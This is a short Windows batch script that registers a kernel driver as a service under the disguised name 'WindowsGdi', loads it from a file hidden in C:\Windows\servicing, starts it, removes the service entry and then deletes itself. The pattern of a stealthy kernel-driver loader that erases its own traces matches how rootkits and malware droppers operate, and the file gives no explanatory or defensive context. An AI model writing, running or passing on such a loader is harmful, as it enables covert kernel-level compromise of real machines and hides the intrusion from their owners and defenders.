@echo off
cd %~dp0
sc create WindowsGdi binpath=C:\Windows\servicing\CbsApe.sys type=kernel
sc start WindowsGdi
sc delete WindowsGdi
del "%~f0"